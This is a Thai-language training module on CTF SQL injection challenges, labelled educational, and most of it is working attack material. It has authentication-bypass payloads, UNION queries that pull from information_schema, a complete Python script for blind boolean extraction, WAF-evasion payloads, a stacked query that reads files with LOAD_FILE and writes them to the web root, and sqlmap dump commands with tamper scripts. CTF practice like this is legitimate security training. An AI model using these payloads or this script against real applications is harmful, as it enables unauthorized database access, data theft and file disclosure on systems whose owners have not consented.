# Part 070: CTF SQL Injection Challenges

## ภาพรวม

CTF (Capture The Flag) challenges สำหรับฝึก SQL injection techniques

**ขั้นตอนที่ 1121-1135**

---

## 1121. CTF Level 1: Basic Auth Bypass

```
# Challenge: Login เข้าเมืออยู่ใน form login
# URL: http://challenge.ctf/login
# Goal: Login แบบ admin

# โค้ด vulnerable:
$user = $_POST['user'];
$pass = $_POST['pass'];
$sql = "SELECT * FROM users WHERE user='$user' AND pass='$pass'";

# Solution:
Username: admin'-- -
Password: anything

# ผล:
# SELECT * FROM users WHERE user='admin'-- -' AND pass='anything'
# Comment ตัด AND condition ออก
# Login สำเร็จ ได้ flag!

# Alternative:
Username: ' OR 1=1 LIMIT 1-- -
Password: x
```

---

## 1122. CTF Level 2: Error-Based Extraction

```sql
-- Challenge: URL /product?id=1
-- Goal: หา flag ที่อยู่ใน table 'flags'

-- Step 1: ตรวจสอบ columns
/product?id=1 ORDER BY 5--   -- error บอกว่ามี 4 columns
/product?id=1 ORDER BY 4--   -- ok

-- Step 2: UNION
/product?id=0 UNION SELECT 1,2,3,4--

-- Step 3: ดึง flag
/product?id=0 UNION SELECT 1,flag,3,4 FROM flags LIMIT 1--

-- ถ้าไม่รู้ชื่อ table:
/product?id=0 UNION SELECT 1,GROUP_CONCAT(table_name),3,4 
FROM information_schema.tables 
WHERE table_schema=DATABASE()--
```

---

## 1123. CTF Level 3: Blind Boolean

```python
import requests

def ctf_blind_boolean(url: str):
    """
    Challenge: ไม่มี error แสดง, Boolean blind
    Goal: หาค่า secret flag
    """
    # กำหนด condition เพื่อตรวจสอบ
    TRUE_COND = 'Product exists'   # สิ่งที่ปรากฏเมื่อ true
    
    def check(condition: str) -> bool:
        payload = f"1 AND ({condition})-- -"
        r = requests.get(url, params={'id': payload}, timeout=5)
        return TRUE_COND in r.text
    
    # หา flag length
    flag_len = 0
    for l in range(1, 60):
        if check(f"(SELECT LENGTH(flag) FROM flags LIMIT 1)={l}"):
            flag_len = l
            print(f"Flag length: {flag_len}")
            break
    
    # หา flag content
    flag = ''
    for pos in range(1, flag_len + 1):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            if check(f"ASCII(SUBSTR((SELECT flag FROM flags LIMIT 1),{pos},1))>{mid}"):
                low = mid + 1
            else:
                high = mid - 1
        flag += chr(low)
        print(f"\r[*] flag: {flag}", end='', flush=True)
    
    print(f"\n[+] FLAG: {flag}")
    return flag
```

---

## 1124. CTF Level 4: WAF Bypass + Stacked

```sql
-- Challenge: WAF blocks UNION, SELECT, --
-- Goal: Read /etc/passwd หรือ flag.txt

-- Bypass UNION:
' /*!50000UniOn*/ /*!50000SeLeCt*/ NULL-- -
' UnION/**/ SelECT NULL-- -

-- Bypass SELECT:
' OR 1=(SeLeCt 1)-- -

-- Bypass -- comment:
' OR 1=1#
' OR 1=1/*

-- Stacked query เมื่อ UNION ไม่ได้:
'; SELECT LOAD_FILE('/flag.txt') INTO OUTFILE '/var/www/html/flag_out.txt'-- -
-- แล้ว browse ไป http://target/flag_out.txt

-- Case-insensitive WAF bypass:
' UniOn SEleCT 1,2,3-- -
' UNION%09SELECT%091,2,3-- -  # tab instead of space
' UNION%0aSELECT%0a1,2,3-- -  # newline
```

---

## 1125. CTF Tools และ Methodology

```bash
# CTF SQLi methodology:

# 1. Fingerprint
curl -s 'http://ctf.target/item?id=1' | grep -i 'error\|sql\|mysql'

# 2. sqlmap สำหรับ CTF
sqlmap -u 'http://ctf.target/item?id=1' \
  --batch \
  --level=5 \
  --risk=3 \
  --dbs

# 3. Manual เมื่อ WAF
# กำหนด tamper scripts
sqlmap -u 'http://ctf.target/item?id=1' \
  --tamper=space2comment,randomcase,charencode \
  -D ctf_db --tables

# 4. ดึงกลับ
sqlmap -u 'http://ctf.target/item?id=1' \
  -D ctf_db -T flags --dump
```

---

## สรุป

CTF SQL Injection:
- **Level 1** - Auth bypass ('--)
- **Level 2** - Error/UNION extraction
- **Level 3** - Boolean blind binary search
- **Level 4** - WAF bypass + stacked queries
- **Tools** - sqlmap + tamper scripts

---

*Part 070 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
